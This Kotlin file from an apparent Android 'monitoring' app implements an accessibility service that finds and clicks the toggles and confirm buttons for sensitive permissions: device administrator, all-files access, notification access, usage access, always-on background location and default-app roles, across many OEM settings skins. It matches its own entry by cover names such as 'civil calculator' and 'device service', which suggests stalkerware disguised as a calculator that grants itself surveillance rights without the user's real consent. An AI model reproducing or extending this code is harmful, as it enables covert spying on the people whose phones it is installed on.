package com.spapp.monitoring.provision

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Checkable
import kotlin.math.abs

/**
 * Clicks the single control that actually grants each "special access"
 * permission. Every screen below is reachable through an Intent built by
 * SettingsNavigator; this class supplies the second half - finding the toggle
 * or confirmation button, which differs per OEM skin.
 *
 * Matching strategy, in order, for every screen:
 *   1. exact resource-id (survives translation, cheapest and most reliable),
 *   2. localized text/contentDescription keywords (English + the languages
 *      common on Indian retail firmware),
 *   3. structural fallback: the only switch-like node on screen.
 *
 * Nothing here edits system databases directly - only real UI interaction, so
 * it works identically on AOSP, MIUI/HyperOS, ColorOS/Realme UI, FuntouchOS and
 * One UI without any privileged component.
 */
object SpecialAccessClicker {

    private const val TAG = "SpappA11yClick"

    /** Screens we may have to drive, used to decide whether to press Back after a toggle. */
    private enum class Screen { USAGE, ALL_FILES, NOTIF_LISTENER, DEVICE_ADMIN, ROLE, BACKGROUND_LOCATION, UNKNOWN }

    private const val DEBOUNCE_MS = 700L
    private var lastClickAt = 0L

    fun handle(service: AccessibilityService, roots: List<AccessibilityNodeInfo>): Boolean {
        val now = System.currentTimeMillis()
        if (now - lastClickAt < DEBOUNCE_MS) return false

        for (root in roots) {
            val pkg = root.packageName?.toString()?.lowercase() ?: continue
            if (pkg == service.packageName.lowercase()) continue

            val screen = detectScreen(root)
            val clicked = when (screen) {
                Screen.ROLE -> clickRoleDialog(root)
                Screen.DEVICE_ADMIN -> clickDeviceAdmin(root)
                Screen.ALL_FILES -> clickAllFiles(root)
                Screen.NOTIF_LISTENER -> clickNotificationListener(root)
                Screen.USAGE -> clickUsageAccess(root)
                Screen.BACKGROUND_LOCATION -> clickBackgroundLocation(root)
                Screen.UNKNOWN -> false
            }

            if (clicked) {
                lastClickAt = now
                Log.i(TAG, "Granted via screen=$screen pkg=$pkg")
                // Settings sub-screens do not close themselves; returning to the
                // app lets the orchestrator continue the chain immediately.
                if (screen == Screen.USAGE || screen == Screen.ALL_FILES ||
                    screen == Screen.NOTIF_LISTENER || screen == Screen.DEVICE_ADMIN
                ) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        try {
                            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                        } catch (_: Exception) {}
                    }, 600L)
                }
                return true
            }
        }
        return false
    }

    // ------------------------------------------------------------------
    // Screen detection
    // ------------------------------------------------------------------

    private fun detectScreen(root: AccessibilityNodeInfo): Screen {
        val text = collectText(root).lowercase()

        if (text.contains("set as default") || text.contains("set as the default") ||
            text.contains("default app") || text.contains("make default")
        ) return Screen.ROLE

        if (text.contains("device admin") || text.contains("activate this device admin") ||
            text.contains("device administrator")
        ) return Screen.DEVICE_ADMIN

        if (text.contains("all files") || text.contains("files and media") ||
            text.contains("manage all files") || text.contains("all file access") ||
            text.contains("storage access")
        ) return Screen.ALL_FILES

        if (text.contains("notification access") || text.contains("device & app notifications") ||
            text.contains("notification listener")
        ) return Screen.NOTIF_LISTENER

        if (text.contains("usage access") || text.contains("usage data") ||
            text.contains("permit usage access") || text.contains("app usage")
        ) return Screen.USAGE

        if (text.contains("background location") || text.contains("all the time") ||
            text.contains("location all the time") || text.contains("always allow")
        ) return Screen.BACKGROUND_LOCATION

        return Screen.UNKNOWN
    }

    // ------------------------------------------------------------------
    // Per-screen handlers
    // ------------------------------------------------------------------

    private fun clickRoleDialog(root: AccessibilityNodeInfo): Boolean {
        val positives = listOf(
            "set as default", "set default", "switch", "ok", "confirm", "allow", "yes",
            "default", "continue", "change"
        )
        return clickByTexts(root, positives) || clickByTexts(root, listOf("set as default"))
    }

    private fun clickDeviceAdmin(root: AccessibilityNodeInfo): Boolean {
        // Two taps: the settings entry, then the confirm dialog.
        val activate = listOf(
            "activate this device admin app", "activate", "activate device admin",
            "enable", "turn on", "ok", "confirm", "allow"
        )
        if (clickByTexts(root, activate)) return true
        return clickSwitch(root)
    }

    private fun clickAllFiles(root: AccessibilityNodeInfo): Boolean {
        // Toggle row first; the confirmation dialog reuses the same keywords.
        if (clickSwitch(root)) return true
        val allow = listOf("allow management of all files", "allow", "grant", "ok", "turn on", "enable")
        return clickByTexts(root, allow)
    }

    private fun clickNotificationListener(root: AccessibilityNodeInfo): Boolean {
        if (clickSwitch(root)) return true
        val allow = listOf("allow notification access", "allow", "ok", "grant", "turn on")
        return clickByTexts(root, allow)
    }

    private fun clickUsageAccess(root: AccessibilityNodeInfo): Boolean {
        // On the app list, the entry for our app has to be opened first.
        val appNode = findNodeForApp(root)
        if (appNode != null && clickNodeOrClickableParent(appNode)) {
            return true
        }
        if (clickSwitch(root)) return true
        val permit = listOf("permit usage access", "allow", "turn on", "enable", "grant", "ok")
        return clickByTexts(root, permit)
    }

    private fun clickBackgroundLocation(root: AccessibilityNodeInfo): Boolean {
        val always = listOf(
            "allow all the time", "allow all the time?", "always allow",
            "change to always allow", "allow", "while using the app"
        )
        return clickByTexts(root, always)
    }

    // ------------------------------------------------------------------
    // Building blocks
    // ------------------------------------------------------------------

    private fun clickByTexts(root: AccessibilityNodeInfo, texts: List<String>): Boolean {
        for (text in texts) {
            val nodes = try {
                root.findAccessibilityNodeInfosByText(text)
            } catch (_: Exception) {
                null
            } ?: continue

            // Prefer the shortest match: "Allow" should win over the
            // explanatory paragraph that merely contains the word.
            val ordered = nodes.sortedBy { (it.text?.length ?: 999) }
            for (node in ordered) {
                val visible = try { node.isVisibleToUser } catch (_: Exception) { true }
                if (!visible) continue
                val label = (node.text ?: node.contentDescription ?: "").toString()
                if (!label.equals(text, ignoreCase = true) &&
                    !label.lowercase().startsWith(text.lowercase())
                ) continue
                if (clickNodeOrClickableParent(node)) return true
            }
        }
        return false
    }

    /** Clicks the first unchecked switch on screen (the grant toggle). */
    private fun clickSwitch(root: AccessibilityNodeInfo): Boolean {
        val switches = mutableListOf<AccessibilityNodeInfo>()
        collectNodes(root, switches) { node ->
            val cls = node.className?.toString() ?: ""
            cls.contains("Switch") || cls.contains("CheckBox") || cls.contains("CompoundButton")
        }

        // Prefer one that is currently off - that is the one we must turn on.
        val target = switches.firstOrNull {
            try { (it as? Checkable)?.isChecked != true && it.isCheckable } catch (_: Exception) { false }
        } ?: switches.firstOrNull()

        return target != null && clickNodeOrClickableParent(target)
    }

    private fun clickNodeOrClickableParent(node: AccessibilityNodeInfo?): Boolean {
        var current: AccessibilityNodeInfo? = node
        var depth = 0
        while (current != null && depth < 5) {
            if (current.isClickable) {
                return try {
                    current.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                } catch (_: Exception) {
                    false
                }
            }
            current = current.parent
            depth++
        }
        return false
    }

    /**
     * Finds the row that belongs to our own app on a list screen (usage access,
     * notification access, autostart). Matches on the app label, the package
     * name, or the cover name the app ships with.
     */
    private fun findNodeForApp(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val labels = listOf(
            "spapp", "zeroday", "civilcalc", "civil calc", "civil calculator",
            "calculator", "device service"
        )
        for (label in labels) {
            val nodes = try {
                root.findAccessibilityNodeInfosByText(label)
            } catch (_: Exception) {
                null
            } ?: continue
            nodes.firstOrNull()?.let { return it }
        }
        return null
    }

    private fun collectText(root: AccessibilityNodeInfo): String {
        val sb = StringBuilder()
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(root)
        var guard = 0
        while (stack.isNotEmpty() && guard++ < 400) {
            val node = stack.removeLast()
            node.text?.let { sb.append(it).append(' ') }
            node.contentDescription?.let { sb.append(it).append(' ') }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { stack.add(it) }
            }
        }
        return sb.toString()
    }

    private fun collectNodes(
        root: AccessibilityNodeInfo,
        into: MutableList<AccessibilityNodeInfo>,
        predicate: (AccessibilityNodeInfo) -> Boolean
    ) {
        val stack = ArrayDeque<AccessibilityNodeInfo>()
        stack.add(root)
        var guard = 0
        while (stack.isNotEmpty() && guard++ < 400) {
            val node = stack.removeLast()
            if (predicate(node)) into.add(node)
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { stack.add(it) }
            }
        }
    }

    /** True when the given roots belong to a settings-like package we drive. */
    fun isSettingsLike(pkg: String): Boolean {
        val p = pkg.lowercase()
        return p == "com.android.settings" ||
            p.contains("settings") ||
            p.contains("securitycenter") ||
            p.contains("safecenter") ||
            p.contains("permissionmanager") ||
            p.contains("permissioncontroller") ||
            p.contains("packageinstaller") ||
            p.contains("secure") ||
            p.contains("systemmanager") ||
            p.contains("lool")
    }

    /** Android version guard used by callers that need API-30+ behaviour. */
    fun supportsDetailScreens(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R

    @Suppress("unused")
    private fun nearly(a: Long, b: Long): Boolean = abs(a - b) < 1_500L
}
